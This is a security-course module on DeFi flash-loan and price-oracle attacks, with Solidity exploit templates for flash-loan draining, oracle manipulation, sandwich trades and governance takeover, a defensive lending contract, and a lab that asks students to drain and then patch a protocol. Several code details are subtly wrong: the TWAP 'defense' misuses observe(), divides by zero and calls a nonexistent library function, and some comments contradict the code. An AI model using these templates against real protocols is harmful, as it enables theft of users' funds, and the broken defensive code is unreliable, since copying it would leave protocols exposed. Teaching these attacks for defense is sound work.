# Module 5 — DeFi Security: Flash Loans and Price Oracle Manipulation

## What You'll Actually Do

You will exploit vulnerable DeFi protocols using flash loans, manipulate price oracles to drain funds, and build defenses that prevent these attacks. You will audit real-world-style lending protocols and DEX implementations for common DeFi vulnerabilities.

## Flash Loan Exploitation

Flash loans let you borrow unlimited tokens with zero collateral — as long as you repay within the same transaction. Attackers use this to artificially inflate balances and exploit flawed protocols.

### Basic Flash Loan Attack Pattern

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import "@aave/v3-core/contracts/interfaces/IPoolAddressesProvider.sol";

contract FlashLoanExploit is FlashLoanSimpleReceiverBase {
    address public vulnerablePool;

    constructor(IPoolAddressesProvider provider) FlashLoanSimpleReceiverBase(provider) {
        vulnerablePool = msg.sender;
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // Step 1: Received flash loan — use it to exploit
        uint256 balanceBefore = IERC20(asset).balanceOf(address(this));

        // Step 2: Interact with vulnerable protocol
        _exploitVulnerablePool(asset, amount);

        // Step 3: Repay flash loan + premium
        IERC20(asset).approve(address(pool), amount + premium);

        return true;
    }

    function _exploitVulnerablePool(address token, uint256 amount) internal {
        // Exploit logic goes here — depends on the vulnerability
        // Common targets: price manipulation, reentrancy, logic flaws
    }

    function attack(address token, uint256 amount) external {
        POOL.flashLoanSimple(address(this), token, amount, "", 0);
    }
}
```

### Price Oracle Manipulation

Most DeFi protocols rely on on-chain price feeds. If they use spot prices from DEX liquidity pools instead of Chainlink oracles, you can manipulate them.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract OracleManipulator {
    IUniswapV2Pair public pair;
    IERC20 public tokenA;
    IERC20 public tokenB;

    constructor(address _pair) {
        pair = IUniswapV2Pair(_pair);
        tokenA = IERC20(IUniswapV2Pair(_pair).token0());
        tokenB = IERC20(IUniswapV2Pair(_pair).token1());
    }

    // Manipulate the reserve ratio to skew the price
    function manipulatePrice(uint256 amountIn) external {
        // Drain tokenA from the pool to skew price upward
        tokenA.transfer(address(pair), amountIn);
        (uint256 reserveA, uint256 reserveB, ) = pair.getReserves();

        // The AMM formula: reserveA * reserveB = k
        // Adding tokenA decreases tokenB's effective price
        // This is exploitable if a protocol reads this pool's price
    }

    // Exploit a lending protocol that uses this pool as price source
    function exploitLending(
        address lendingProtocol,
        uint256 borrowAmount
    ) external {
        // 1. Manipulate price
        manipulatePrice(1000 ether);

        // 2. Deposit inflated collateral
        // 3. Borrow at manipulated price
        // 4. Restore price
        // 5. Profit from the difference
    }
}
```

## Real-World Attack Vectors

### Oracle Sandwich Attack

```solidity
// Attacker controls blocks to manipulate TWAP
// 1. Swap large amount to move price
// 2. Victim's transaction executes at manipulated price
// 3. Swap back to restore price and pocket profit

function sandwichAttack(address router, address token) external {
    // Pre-swap: dump tokens to crash price
    uint256 amountIn = 500 ether;
    ISwapRouter(router).exactInputSingle(
        ISwapRouter.ExactInputSingleParams({
            tokenIn: token,
            tokenOut: WETH,
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        })
    );

    // Victim's tx executes here at manipulated price

    // Post-swap: buy back tokens cheaper
    // Net profit from the price difference
}
```

### Flash Loan + Governance Attack

```solidity
// 1. Flash borrow governance tokens
// 2. Create and pass malicious proposal
// 3. Drain treasury
// 4. Repay flash loan

function governanceAttack(address governance, address treasury) external {
    uint256 totalSupply = IERC20(governance).totalSupply();

    // Flash borrow majority of tokens
    POOL.flashLoanSimple(
        address(this),
        governance,
        totalSupply / 2 + 1,
        "",
        0
    );

    // Vote on malicious proposal
    // Execute it to drain funds
}
```

## Defensive Patterns

```solidity
// Use Chainlink oracle instead of spot price
import "@chainlink/contracts/src/v0.8/AggregatorV3Interface.sol";

contract SafeLending {
    AggregatorV3Interface internal priceFeed;
    uint256 public constant STALENESS_THRESHOLD = 3600; // 1 hour

    constructor(address _priceFeed) {
        priceFeed = AggregatorV3Interface(_priceFeed);
    }

    function getSecurePrice() public view returns (uint256) {
        (
            uint80 roundId,
            int256 answer,
            ,
            uint256 updatedAt,
        ) = priceFeed.latestRoundData();

        require(answer > 0, "Invalid price");
        require(
            block.timestamp - updatedAt <= STALENESS_THRESHOLD,
            "Stale price"
        );
        require(roundId > 0, "Round not complete");

        return uint256(answer);
    }

    // Use time-weighted average price for additional safety
    function getTWAP(address pair) public view returns (uint256) {
        (uint32[] memory secondsAgos, uint256[] memory tickCumulatives) =
            IUniswapV3Pool(pair).observe(new uint32[](2));

        int24 tick = int24(
            (tickCumulatives[1] - tickCumulatives[0]) /
            (secondsAgos[1] - secondsAgos[0])
        );

        return uint256(
            FixedPointMathLib.getSqrtRatioAtTick(tick)
        );
    }
}
```

## Assessment

**Lab Task:** Deploy a vulnerable lending protocol that uses DEX spot prices as its oracle. Then write a flash loan exploit contract that drains the protocol by manipulating the oracle. Finally, patch the vulnerability by integrating Chainlink price feeds.

**Time:** 120 minutes

**Grading:**
- Flash loan contract compiles and executes (25 points)
- Price oracle manipulation successfully drains target (25 points)
- Defensive patch prevents the attack (25 points)
- Written explanation of the attack flow (25 points)

## Evidence

- Flash loan exploit contract source code
- Vulnerable lending protocol source code
- Exploit execution showing drained balances
- Patched lending protocol that resists the attack
- Attack narrative explaining each step
